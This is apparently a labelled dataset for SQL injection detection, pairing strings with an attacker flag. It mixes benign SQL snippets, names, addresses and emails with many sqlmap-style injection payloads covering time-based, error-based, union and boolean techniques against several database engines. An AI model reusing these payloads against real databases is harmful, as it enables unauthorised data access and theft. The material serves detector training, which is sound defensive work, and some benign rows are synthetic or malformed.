Payload	Attacker
l-e3a06l	0
SELECT * FROM due	0
p05f74a.r	0
SELECT * FROM riding WHERE    NOT work = 'known'	0
1'||  (  select 'zxla' from dual where 7634  =  7634 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'   )    )   ||'	1
SELECT COUNT ( these ) FROM lovely	0
feix ablitas	0
SELECT * FROM desk FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM essential	0
calle da unidade, 184 7e	0
SELECT TOP 3 * FROM nearer SELECT * FROM visitor 3SELECT * FROM purple	0
1' and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'wytg'  =  'wytg	1
de_souza	0
 select * from users where id  =  1 <@$$ union select 1,version  (    )   -- 1	1
serra stark	0
1  )   as zmjm where 9125  =  9125 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --	1
-5202 union all select 5332,5332,5332,5332,5332,5332,5332#	1
1  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  4959  =  4959	1
SELECT * FROM itself WHERE made = 'equal'  OR universe = 'concerned'	0
SELECT * FROM tent WHERE struck BETWEEN 'transportation' AND 'include'	0
SELECT thrown ( s ) FROM motion INNER JOIN	0
SELECT TOP 50 PERCENT * FROM left	0
1' where 5335  =  5335	1
SELECT beauty ( s )  FROM locate SELECT modern ( s ) 	0
   SELECT class, fast, offer FROM beside WHERE arrive  IS NULL	0
480040000000000	0
 SELECT column_name ( s )  FROM pack,said	0
SELECT * FROM expect WHERE funny = 'wind' FETCH FIRST 3 ROWS ONLY	0
INSERT INTO population ( missing, therefore, particularly, other, herself, yes )  VALUES  ( 'product', 'shop'. time', 'active', 'active', 'open', 'before' )  	0
1'  )   where 8204  =  8204	1
cassasola nochez	0
1'+  (  select 'gjaq' where 5449  =  5449 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null   )    )   +'	1
1' in boolean mode  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  #	1
1'   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   'zizo' like 'zizo	1
89285662f	0
SELECT sentence	0
SELECT * FROM call	0
suwanawo5	0
724	0
1'   )    )    as jtmf where 3937  =  3937	1
-5139   )    )    union all select 3373,3373,3373,3373,3373,3373,3373,3373#	1
1%'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #	1
SELECT * FROM within WHERE will = 'purple' FETCH FIRST 3 ROWS ONLY	0
1 where 8949  =  8949 and make_set  (  8403  =  8403,8899  )  --	1
121	0
1'  )   where 6056  =  6056 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --	1
cherwin4@xavipetit.mu	0
-2707'   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  'mwdq'  =  'mwdq	1
74	0
SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 6623 )  ORDER BY meta_id ASC	0
-7453'   )    )     )   or 8571  =  8571--	1
"1""   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""vhey""  =  ""vhey"	1
-7860'   )    )     )   union all select 7420,7420,7420,7420,7420,7420,7420,7420,7420,7420--	1
 and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...	1
refriega	0
   SELECT lady, crack, discovery FROM grade WHERE captured  IS NULL	0
"1"" where 7005  =  7005"	1
herrmann@codwatw.edu	0
SELECT * FROM never WHERE at = 'level'	0
  SELECT personalID AS ID, tape AS couple FROM happy	0
SELECT COUNT ( DISTINCT recent )  FROM mysterious	0
"-1030"" where 2161  =  2161 union all select 2161,2161,2161,2161,2161,2161,2161,2161,2161,2161--"	1
1%' union all select null,null,null,null,null,null,null,null,null,null--	1
SELECT COUNT ( purpleID ) FROM why	0
roquemore@veocime.bu	0
"1""  )   where 1024  =  1024 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --"	1
1 where 8393  =  8393	1
"1""  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""rkfk"" like ""rkfk"	1
1'   )    )    as lmsl where 3753  =  3753 or elt  (  5873  =  5873,sleep  (  5   )    )   #	1
1   )    )     )   union all select null,null,null,null#	1
"1""   )    )    rlike sleep  (  5  )   and    (    (   ""ahhx"" like ""ahhx"	1
vish	0
solter@aclub.com.ke	0
1  )   as drbw where 2380  =  2380 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --	1
asia	0
1' where 9544  =  9544	1
1%'  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  '%'  =  '	1
SELECT edge ( s )  FROM tree FULL OUTER JOIN	0
casado vallcorba	0
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""%""  =  """	1
1 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   -- kegk	1
1  )   where 8474  =  8474 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --	1
"1""  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  ""ponv""  =  ""ponv"	1
paula pladellorens	0
7311	0
valbuena de duero	0
s5bal850de	0
pelayos	0
mckearne	0
saleta	0
SELECT population ( s ) FROM star INNER JOIN	0
crosby	0
camino del caliero, 75	0
SELECT * FROM body WHERE canal BETWEEN useful09/01/1996mind AND mountain15/31/1996thing	0
carrer puigmercadal 33 5h	0
1' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  	1
"1"" where 7344  =  7344 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --"	1
" select * from users where id  =  1 or 1#""  (   union select 'a',version  (    )   -- 1"	1
978	0
-9098'||  (  select 'xodn' from dual where 8202  =  8202 union all select 8202,8202,8202,8202,8202,8202,8202--	1
SELECT kind FROM avoid UNION SELECT hurt FROM fastened ORDER BY fort	0
"SELECT ADDDATE ( ""2017-06-15 09:34:21"", INTERVAL 15 MINUTE ) ;"	0
-2434  )   union all select 8310,8310,8310,8310,8310--	1
1'||  (  select 'xuof' from dual where 8794  =  8794 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --	1
10702	0
vajil-la	0
SELECT * FROM generally WHERE master = 'right' FETCH FIRST 3 ROWS ONLY	0
brockie	0
"1%""   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  ""%""  =  """	1
"1""  )   as kfvy where 7305  =  7305 or sleep  (  5  )  --"	1
SELECT * FROM cut	0
berba.andreguy4@campanasextractoras.sh	0
calle montes claros 9	0
1 where 4331  =  4331 union all select null,null,null,null,null,null#	1
  SELECT held,cow,plenty FROM may LEFT JOIN Orders ON stop.courseID =  deeply.machine ORDER BY about.sit	0
1'||  (  select 'vuku' where 3143  =  3143 waitfor delay '0:0:5'--	1
faus 195,	0
ransell	0
  SELECT giant,having FROM suit WHERE medicine = 'read' UNION SELECT explanation, biggest FROM time	0
1%'  )   union all select null,null,null--	1
SELECT chemical ( s )  FROM coat UNION	0
1  )   where 9821  =  9821 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #	1
"1""  )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --"	1
SELECT * FROM planet WHERE nest = 'steam' LIMIT 3	0
rua picouto, 14,	0
  (  select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  	1
1'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'toft'  =  'toft	1
antoine	0
"1""  )   and elt  (  1889  =  7397,7397  )   and   (  ""kuau""  =  ""kuau"	1
fabrs xamena	0
1'  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  	1
 SELECT City, Country FROM Customers WHERE Country = 'Germany' UNION ALL 	0
SELECT * FROM hope FETCH FIRST 3 ROWS ONLY	0
calle profeta, 96, 2?c	0
   SELECT COUNT ( piece ) , but FROM add BY main	0
1'  )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --	1
"-8106%""  )   union all select 2051,2051,2051,2051,2051,2051#"	1
wamba	0
1'   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  'cbnc' like 'cbnc	1
SELECT pale ( s )  FROM paper	0
revuelta borgua	0
SELECT * FROM very WHERE yard = 'glass'  OR couple = 'however'	0
SELECT * FROM receive WHERE Price NOT BETWEEN 10 AND 20	0
winde	0
SELECT * FROM sad WHERE    NOT dear = 'collect'	0
-4184'   )    )     )   or 2579  =  4654#	1
"1""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""sdvu"" like ""sdvu"	1
1   )    )     )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --	1
SELECT * FROM check ORDER BY anything DESC	0
"1%""   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""%""  =  """	1
DELETE FROM society WHERE center = 'view'	0
-8038'   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   'xfyq'  =  'xfyq	1
1%'  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  '%'  =  '	1
"1""  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  ""ubvd""  =  ""ubvd"	1
braschi_courtneidge@djbroadcast.an	0
"1%"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and ""%""  =  """	1
SELECT * FROM  ( SELECT wrapped FROM recall ) 	0
1  )   as cnpv where 4902  =  4902 and elt  (  1210  =  1210,sleep  (  5   )    )   --	1
deyecta	0
innes	0
SELECT * FROM increase 3 SELECT * FROM train	0
1'||  (  select 'cclo' from dual where 6823  =  6823 and 9198  =  9198--	1
SELECT scientific ( s )  FROM term UNION ALL	0
 SELECT * FROM wire ORDER BY receive, knife	0
SELECT COUNT ( chargeID ) FROM sheet	0
"1"" where 3368  =  3368 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --"	1
08109487d	0
SELECT promised ( s )  FROM itself FULL OUTER JOIN	0
trebaol@arroyomolinos-madrid.gq	0
10970	0
SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 53820 )  ORDER BY meta_id ASC	0
SELECT south ( s )  FROM just UNION ALL	0
SELECT * FROM left WHERE welcome = 'throat'  OR football = 'ago'	0
1   )    )     )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  7589  =  7589	1
select * from generate_series  (  3341,3341,case when   (  3341  =  3072  )   then 1 else 0 end  )   limit 1--	1
25660	0
iif  (  1095  =  2853,1,1/0  )  	1
enratonarse	0
trobos 39 4e	0
SELECT COUNT ( needle )  FROM difficulty	0
SELECT metal FROM certain UNION ALL SELECT twenty FROM seat ORDER BY probably	0
"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --"	1
  SELECT MAKEDATE ( 2017, 175 ) ;	0
SELECT * FROM paper WHERE night NOT LIKE 'basic%'	0
SELECT TOP 3 * FROM gray WHERE tropical = 'son'	0
SELECT * FROM  ( SELECT attack FROM nearby ) 	0
SELECT * FROM more  WHERE exactly NOT LIKE '[teach]%'	0
1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --	1
-1621' in boolean mode  )   order by 1--	1
SELECT army ( s )  FROM coach LEFT JOIN	0
SELECT * FROM lady ORDER BY positive	0
SELECT * FROM son WHERE leaf = 'open'	0
1'   )    )    union all select null,null,null,null--	1
1'+  (  select kgon where 9014  =  9014   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users   )    )   +'	1
SELECT * FROM vegetable WHERE purpose = 'canal'  OR last = 'paint'	0
repuesta	0
lopez castrillon 162	0
1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ulep'  =  'ulep	1
1' in boolean mode  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  #	1
augur	0
 SELECT column_name ( s )  FROM speech,central	0
serrtil	0
SELECT consonant FROM numeral UNION ALL SELECT least FROM particular ORDER BY funny	0
"1""   )    )     )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  ""ruvo"" like ""ruvo"	1
"1""   )    )    and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   ""uzbl""  =  ""uzbl"	1
"1"" and sleep  (  5  )  #"	1
"1""  )   and make_set  (  8403  =  8403,8899  )   and   (  ""akha"" like ""akha"	1
SELECT stream FROM sport	0
6503450000000000	0
-4259'   )    )    as usqu where 5419  =  5419 or elt  (  8325  =  8837,8837  )  --	1
iif  (  2976  =  2976,1,1/0  )  	1
476en9o9na5	0
1  )   as cinw where 3732  =  3732 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --	1
1 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  # cykf	1
SELECT COUNT ( grew )  FROM noise	0
quint	0
zaharoff0	0
strucak@cortell.cat	0
1'   )    )    as uncy where 8009  =  8009 union all select null,null,null,null,null,null,null,null,null#	1
overman@saavedradiaz.travel	0
SELECT TOP 50 PERCENT * FROM remember	0
1%'   )    )    or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   '%'  =  '	1
c/ galvan 98 10?a	0
ludwig_schuster@viavilano.web	0
1'   )    )    and 2401  =  4693 and    (    (   'ssrm'  =  'ssrm	1
SELECT * FROM flies ORDER BY voice DESC	0
-4400 union all select 3983,3983,3983,3983,3983,3983,3983,3983,3983,3983--	1
cabaeros, 131	0
" select * from users where id  =  1 or ""{,""  =  1 or 1  =  1 -- 1"	1
santa catalina 81	0
SELECT * FROM negative WHERE poor = 'third' LIMIT 3	0
  SELECT hospital AS double, saved AS [desk]  FROM musical	0
SELECT * FROM actually WHERE riding = 'writing' FETCH FIRST 3 ROWS ONLY	0
SELECT * FROM smooth WHERE choose BETWEEN 'news' AND 'drop'	0
SELECT TOP 50 PERCENT * FROM oxygen	0
calle regimineto del sol 48 10e	0
8851190000000001	0
select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  'hmsu'  =  'hmsu	1
5580430000000000	0
SELECT * FROM fruit  WHERE toy NOT LIKE '[bend]%'	0
SELECT COUNT ( jarID ) FROM teeth	0
-2432'   )    )    or   (  8459  =  8459  )  *4906 and    (    (   'ejhp'  =  'ejhp	1
"1"" or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and ""uqor"" like ""uqor"	1
"1%""  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  ""%""  =  """	1
crislida	0
SELECT AVG ( dust ) FROM dot	0
SELECT castle	0
47494	0
end-- elvi	1
9.84215E+015	0
4s2cu8e44	0
marling	0
calle castropol 11	0
SELECT window FROM zulu UNION SELECT lamp FROM entirely ORDER BY ability	0
SELECT weight FROM possible UNION SELECT what FROM egg ORDER BY orange	0
1'  )   where 8252  =  8252 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #	1
1'+  (  select 'supo' where 8691  =  8691	1
-5615'  )   where 5931  =  5931 or 8450  =  9229	1
-9557  )   where 2891  =  2891 union all select 2891,2891,2891,2891,2891,2891,2891,2891,2891--	1
5469	0
25480	0
-5425 where 5933  =  5933 union all select 5933,5933,5933--	1
SELECT * FROM  ( SELECT fight FROM roll ) 	0
"""*"""	1
SELECT particular ( s )  FROM smoke SELECT whatever FROM tried	0
"-8013%"" or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""%""  =  """	1
"1""   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   ""tbdl"" like ""tbdl"	1
1'+  (  select qsmo where 3172  =  3172	1
bourne_sereys8@demasiado.com.ye	0
plaza pont 47, 6?e	0
SELECT * FROM physical WHERE hearing = 'shirt'  OR opinion = 'breath'	0
SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28547 )  ORDER BY meta_id ASC	0
1'  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  	1
furnari pentinat	0
1 and elt  (  2770  =  3669,3669  )  # sfls	1
 select * from users where id  =  1 union select 1 $$,version  (    )   -- 1	1
select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and 'qipt'  =  'qipt	1
pettingill@demasiado.com.bv	0
-2756' where 6156  =  6156 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --	1
"1%"" or elt  (  6272  =  6272,sleep  (  5   )    )    and ""%""  =  """	1
SELECT * FROM managed WHERE fish = 'pencil' LIMIT 3	0
5756	0
SELECT * FROM door WHERE    NOT pleasant = 'local'	0
"-1748%""   )    )     )   union all select 2987#"	1
hwei-lin	0
SELECT * FROM riding FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM able	0
  SELECT * FROM aid WHERE do IN  ( 'machinery', 'written', 'label' )  	0
1   )    )    as acni where 6355  =  6355 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --	1
  UPDATE family SET dirt =  'alphabet', City =  'specific' WHERE pain =  temperature	0
"1"" where 8571  =  8571"	1
1'  )   where 3588  =  3588	1
1  )   where 5464  =  5464 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --	1
 select * from users where id  =  11||1 union select 1,banner from v$version where rownum  =  1 -- 1	1
SELECT COUNT ( DISTINCT light )  FROM weigh	0
SELECT * FROM goose WHERE mistake BETWEEN judge09/01/1996twelve AND within15/31/1996plain	0
SELECT * FROM women WHERE ride = 'closely'  OR process = 'passage'	0
1%'   )    )     )   union all select null,null,null,null,null,null,null,null,null,null#	1
rio nervion, 177	0
"1"" rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   "	1
torremoroso enrich	0
1%'  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  '%'  =  '	1
SELECT * FROM combination WHERE former = 'lovely' LIMIT 3	0
plaa adria 152,	0
"1""  )   where 9115  =  9115"	1
"1%""   )    )     )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (     (  ""%""  =  """	1
1136300000000000	0
SELECT TOP 3 * FROM plenty	0
-7584' union all select 1132,1132,1132,1132,1132,1132,1132,1132,1132,1132#	1
SELECT * FROM market WHERE beautiful = 'thus'  OR crowd = 'is'	0
SELECT * FROM coach WHERE rose = 'wooden'	0
SELECT COUNT ( examine ) FROM congress	0
DELETE FROM bow	0
axman@culturalsanpedrocf.ie	0
4364	0
DELETE FROM fewer	0
2.02612E+015	0
1  )   as fgqe where 1526  =  1526 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --	1
gaspard-birgel@indorec.kr	0
denice	0
SELECT passage FROM wooden	0
SELECT attention ( s )  FROM trunk UNION	0
SELECT option_value FROM wp_options WHERE option_name  =  'zcf_crmformswpbuilder_settings' LIMIT 1	0
6612710000000000	0
woll@stockdefotos.bb	0
1 where 7240  =  7240 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --	1
massimo	0
"1%""  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --"	1
SELECT * FROM today WHERE bottle = 'importance' FETCH FIRST 3 ROWS ONLY	0
SELECT instrument FROM way UNION SELECT vast FROM sport ORDER BY rubber	0
a8ique0r4r	0
   SELECT limited, cage, simplyFROM choice WHERE supply  IS NOT NULL	0
  SELECT taste AS zoo, black AS [form]  FROM musical	0
SELECT * FROM spider FETCH FIRST 50 PERCENT ROWS ONLY	0
SELECT * FROM aboard	0
SELECT drive ( s FROM laid RIGHT JOIN	0
"1""   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  ""tpxo"" like ""tpxo"	1
95549133a	0
"SELECT * FROM Users WHERE Name  = ""John Doe"" AND Pass  = ""myPass"""	0
vazkn	0
SELECT hit ( s )  FROM smile FULL OUTER JOIN	0
SELECT AVG ( cent )  FROM slipped  SELECT SUM ( mind ) 	0
SELECT AVG ( official ) FROM body	0
SELECT AVG ( oldest ) FROM send SELECT SUM ( solid ) 	0
SELECT * FROM merely	0
20120	0
1'  )   as xrap where 5523  =  5523 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #	1
SELECT TOP 3 * FROM wave SELECT * FROM tribe 3SELECT * FROM football	0
41953346n	0
select   (  case when   (  2716  =  8138  )   then 2716 else 2716*  (  select 2716 from mysql.db  )   end  )  #	1
522lta	0
valladolid	0
 or sleep  (  __TIME__  )    =  '	1
subidor	0
calle alfaz del pi, 96 11?d	0
1'  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  'yabn'  =  'yabn	1
select count  (  *  )   from generate_series  (  1,5000000  )   and   (  8997  =  8997	1
4396	0
1'   )    )    as hzbj where 1725  =  1725 or sleep  (  5  )  #	1
"1"" and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and ""wtkx""  =  ""wtkx"	1
23611	0
-5667%'   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   '%'  =  '	1
SELECT DISTINCT cattle FROM near	0
vilma	0
SELECT SupplierName FROM Suppliers	0
